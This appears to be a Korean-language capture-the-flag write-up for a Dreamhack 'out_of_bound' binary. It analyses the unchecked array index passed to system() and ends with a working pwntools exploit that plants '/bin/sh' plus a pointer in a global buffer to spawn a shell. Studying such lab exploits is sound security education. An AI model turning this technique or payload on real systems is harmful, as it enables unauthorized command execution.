#OOB #명령어주입

### 1. 파일 분석

file ./out_of_bound
./out_of_bound: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d83d8fb5458a8e0b408a23c97dfed327c1a8462c, not stripped

```
$ checksec out_of_bound
[*]
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

실습환경에는 ASLR이 적용되어 있고, 바이너리에는 NX와 Canary가 적용되어 있다. PIE는 적용되지 않았다.

ASLR이 적용되어 있기 때문에 실행시 마다 스택, 라이브러리 등의 주소가 랜덤화되고, NX가 적용되어 있기 때문에  임의의 위치에 셸코드를 집어 넣은 후 그 주소의 코드를 바로 실행 시킬 수 없다. Canary가 적용되어 있기 때문에 스택 맨 위에 존재하는 SFP, RET 과 그 뒷 주소를 마음대로 변경할 수 없다.

PIE 가 적용되지 않기 때문에 해당 바이너리가 실행되는 메모리 주소가 랜덤화 되지 않는다. 따라서 데이터 영역의 변수들은 항상 정해진 주소에 할당된다.

### 2. C 소스파일 분석

``` c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

/*
name은 16 바이트 크기의 버퍼
command 배열은 char * 포인터를 담고 있고, 몇개만 초기화되어 있음.
*/
char name[16];

char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };
void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main()
{
    int idx;

    initialize();

    /*
    name 버퍼에 최대 16바이트를 read함.
    길이 제한(sizeof(name))이 정확히 설정되어잇어서  여기서는 버퍼 오버플로우는 발생하지 않음.

    정수 입력을 받아 command[idx]를 실행.
    이때 입력값 검증과정이 없기 때문에 취약점 발생.
    idx 가 0~4 이면 정상적으로 실행됨.
    idx 가 5~9 이면 NULL 이라서 system(NULL) 호출 -> segmentation fault(프로그램 종료)
    idx 가 음수 또는 큰수라면? -> command 은 배열 범위 밖 메모리를 system()의 인자로 접근 할 수 있다.-> Out of Bounds Read 취약점 발생.
    만약 그 주소에 공격자가 제어 가능한 문자열이 있다면, 원하는 커맨드를 실행할 수 있음.
    */
    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;
}

```

Out of bounds  취약점을 사용해 command[idx] 에 "/bin/sh\x00"이 들어가게 시도한다.

### 3. 익스플로잇

#### 1) 익스플로잇

command[idx] 의 값이 "ls", "id", "ps", "file ./oob", "cat" 5개 중 하나로 정해지려면 idx 에는 0 ~ 4 의 값만 들어가야 한다. 그러나 idx 의 범위에 대한 검사를 진행하지 않기 때문에 음수 값을 집어 넣어 command 주소보다 더 앞의 주소를 가져오거나, 4보다 큰 값을 집어넣어 "file ./oob" 가 저장된 주소보다 뒤의 주소를 가져 올 수 있다.

따라서 Out of bound 취약점이 발생한다. 

#### 2) command 와 name 의 주소 확인

command와 name 전역변수는 PIE가 꺼져 있기 때문에 실행시마다 일정한 주소에 위치한다.

```
pwndbg> p &command
$1 = (<data variable, no debug info> *) 0x804a060 <command>
pwndbg> p &name
$2 = (<data variable, no debug info> *) 0x804a0ac <name>
```

command 는 0x804a060,  name 은 0x804a0ac로, 74 바이트만큼 차이가 난다.
그러면 command[idx] 가 name 이나 name의 한 부분을 가리키게 만드는 것을 생각해 보자.
먼저 command 는 char * 형으로 정의되어 있다. x86, 즉 32비트 환경에서 실행되는 바이너리이기 때문에 각 주소는 32비트 또는 4바이트로 표현된다.

따라서 \*command = command[0] = 0x804a060 의 주소에 저장되어 있는 값을 가지고, command[1] 은 0x804a060 + 4 0x804a064 의 주소에 저장되어 있는 값을 가진다.

따라서 command[19] = 0x804a060 + 76 이 되어 name 의 주소에 저장되어 있는 값을 가리킨다.

#### 3) system 함수에 인자 전달.

name에 "/bin/sh\x00" 이 저장되어 있는 상황에서 idx = 19 를 입력한 상황을 시뮬해 본다.
```
...
   0x08048727 <+92>:    push   0x8048832
   0x0804872c <+97>:    call   0x8048540 <__isoc99_scanf@plt>
   0x08048731 <+102>:   add    esp,0x10
   0x08048734 <+105>:   mov    eax,DWORD PTR [ebp-0x10]
   0x08048737 <+108>:   mov    eax,DWORD PTR [eax*4+0x804a060]
   0x0804873e <+115>:   sub    esp,0xc
   0x08048741 <+118>:   push   eax
   0x08048742 <+119>:   call   0x8048500 <system@plt>
   0x08048747 <+124>:   add    esp,0x10
   0x0804874a <+127>:   mov    eax,0x0
   0x0804874f <+132>:   mov    edx,DWORD PTR [ebp-0xc]
   0x08048752 <+135>:   xor    edx,DWORD PTR gs:0x14
   0x08048759 <+142>:   je     0x8048760 <main+149>
   0x0804875b <+144>:   call   0x80484e0 <__stack_chk_fail@plt>
   0x08048760 <+149>:   mov    ecx,DWORD PTR [ebp-0x4]
   0x08048763 <+152>:   leave
   0x08048764 <+153>:   lea    esp,[ecx-0x4]
   0x08048767 <+156>:   ret
End of assembler dump.
pwndbg> b *main + 119
Breakpoint 1 at 0x8048742
```

```
pwndbg> r
Starting program: /home/jerry/bound/out_of_bound
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Admin name: /bin/sh
What do you want?: 19
```

```
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
*EAX  0x6e69622f ('/bin')
*EBX  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
*ECX  0xffffbc24 —▸ 0xffffbc38 ◂— 0x13
 EDX  0x0
*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
*ESI  0xffffbd14 —▸ 0xffffbf6f ◂— '/home/jerry/bound/out_of_bound'
*EBP  0xffffbc48 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0x0
*ESP  0xffffbc20 ◂— 0x6e69622f ('/bin')
*EIP  0x8048742 (main+119) —▸ 0xfffdb9e8 ◂— 0x0
───────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────
 ► 0x8048742 <main+119>    call   system@plt                     <system@plt>
        command: 0x6e69622f ('/bin')
```

system 함수에 인자로 EAX 레지스터의 값인 "/bin"이 들어 간 것을 볼 수 있다. 올바르게 진행 하기 위해서는 "/bin/sh\x00" 문자열 자체가 아닌, "/bin/sh\x00" 문자열이 저장되어 있는 주소가 인자로 들어가야 한다.
따라서 EAX 의 주소인 0x804a0ac 가 들어가야 한다.

#### 4) Payload 작성

name 에 8바이트의 "/bin/sh\x00" 을 넣은 후, 그 뒤에 pwntools의 p32 함수를 사용해  만든 0x804a0ac 를 붙여 총 12바이트를 저장한다.

그러면 name + 8 이 가지는 값이 0x804a0ac 이 되게 되고, command[19 + 2] = \*(name + 8) = 0x804a0ac 의 값을 가지게 된다.

system(0x804a0ac) 을 실행하면 0x804a0ac 주소, 즉 name 에 있는 "/bin/sh\x00" 를 실행시킬 수 있게 된다. 
전송해야 하는 idx 의 값은 19가 아닌 19 + 2 = 21 임의 유의하자.

``` python
from pwn import *

p = process("./out_of_bound")
# p = remote("host3.dreamhack.games", 18187)

'''
name변수에 system() 함수가 실행한 "/bin/sh\0x00"을 저장.
바로 이어서 name변수의 주소값을 추가.
name의 메모리 위치가 command를 기준으로 command[19]이므로 뒤에 추가로 적은 name 변수의 주소값이 있는 곳은 command[21] 이 된다.

1차적으로 read 함수와 연결되는 첫번째 sendline에 payload를 보내고,
2차적으로 systme()함수에서 name의 주소를 이용하기 위해 "21"을 scanf()에 의해 입력.

결과적으로 system(command[21])이 실행됨.
'''
payload = b"/bin/sh\x00" + p32(0x804a0ac)

p.sendline(payload) # read() 함수로 payload 전달
p.sendline(b"21")   # scanf() 함수로 payload 전달.

p.interactive()
```

문자열이 함수의 인자로 전달되는 과정에서 문자열 자체가 아닌 문자열을 가리키는 주소, 다른 말로 포인터를 전달해야 함다. !!!!!!!!!!